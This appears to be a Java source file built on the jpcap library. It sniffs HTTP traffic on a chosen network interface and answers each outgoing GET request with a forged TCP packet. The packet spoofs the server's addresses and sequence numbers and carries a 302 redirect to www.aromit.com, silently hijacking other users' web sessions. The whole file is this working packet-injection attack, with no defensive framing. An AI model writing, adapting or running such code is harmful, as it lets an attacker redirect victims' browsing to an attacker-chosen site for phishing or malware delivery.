import java.io.BufferedReader;
import java.io.InputStreamReader;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;
import jpcap.PacketReceiver;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

public class TestTcpSend implements PacketReceiver {
	NetworkInterface[] devices = null;
	String inData = null;
	static JpcapSender sender = null;

	public void getInterface() throws Exception {
		devices = JpcapCaptor.getDeviceList();

		System.out.println("usage: java TestTcpSend <select a number from the following>");

		for (int i = 0; i < devices.length; i++) {
			System.out.println(i + " :" + devices[i].name + "(" + devices[i].description + ")");
			System.out.println("    data link:" + devices[i].datalink_name + "(" + devices[i].datalink_description + ")");
			System.out.print("    MAC address:");
			for (byte b : devices[i].mac_address)
				System.out.print(Integer.toHexString(b & 0xff) + ":");
			System.out.println();
			for (NetworkInterfaceAddress a : devices[i].addresses)
				System.out.println("    address:" + a.address + " " + a.subnet + " " + a.broadcast);
		}

		BufferedReader br = null;

		StringBuffer buf = new StringBuffer();
		buf.append("===============================\n\n");
		buf.append("<== 원하는 Netwokr Card 번호 입력 : ");
		System.out.println(buf.toString());

		br = new BufferedReader(new InputStreamReader(System.in));
		inData = br.readLine();

		// interface, 패킷양(byte), true(모든 지나가는 회선 패킷) false(내 PC가 호스트인 패킷),
		// timeout(ms)
		JpcapCaptor jpcap = JpcapCaptor.openDevice(devices[Integer.parseInt(inData)], 64, false, -1);
		sender = JpcapSender.openDevice(devices[Integer.parseInt(inData)]);

		jpcap.setFilter("port 80", true);

		// int 출력할 패킷수, -1 은 무한데
		jpcap.loopPacket(-1, new TestTcpSend());
	}

	public void receivePacket(Packet packet) {
		TCPPacket tcpPacket = (TCPPacket) packet;

		// GET 값을 구한다
		if(tcpPacket.ack&&tcpPacket.psh&&!tcpPacket.dst_ip.toString().equals("/211.45.156.89")){
			byte[] bBytes = new byte[3];
			System.arraycopy(tcpPacket.data, 0, bBytes, 0, 3);
	
			// GET일경우만 SEND한다.
			if (new String(bBytes).equals("GET")) {
				sendPacket(sender, packet);
			}
		}

	}
	
	public void sendPacket(JpcapSender sender, Packet packet){
		try {
			TCPPacket tcpPacket = (TCPPacket)packet;
			
			EthernetPacket ethernet = (EthernetPacket)packet.datalink;
			
			EthernetPacket ether=new EthernetPacket();
			ether.frametype=EthernetPacket.ETHERTYPE_IP;
			ether.src_mac=ethernet.dst_mac;
			ether.dst_mac=ethernet.src_mac;
			
			TCPPacket p=new TCPPacket(tcpPacket.dst_port,tcpPacket.src_port,tcpPacket.ack_num,tcpPacket.sequence+206,
					false, true,true,false,false,true,false,false,0,tcpPacket.urgent_pointer);
			p.setIPv4Parameter(tcpPacket.priority,tcpPacket.d_flag,tcpPacket.t_flag,tcpPacket.r_flag,tcpPacket.rsv_tos,false,
					false,false,tcpPacket.offset,tcpPacket.ident+23187,226,tcpPacket.protocol,tcpPacket.dst_ip,tcpPacket.src_ip);
			p.data=("HTTP/1.0 302 Redirect\r\nLocation: http://www.aromit.com\r\n\r\n").getBytes();
			p.datalink=ether;
			sender.sendPacket(p);
			
		} catch (Exception e) {
			System.out.println("sendPacketException : " + e.getMessage());
		}
	}

	public static void main(String[] args) throws Exception {
		TestTcpSend testTcpSend = new TestTcpSend();
		testTcpSend.getInterface();
	}
}
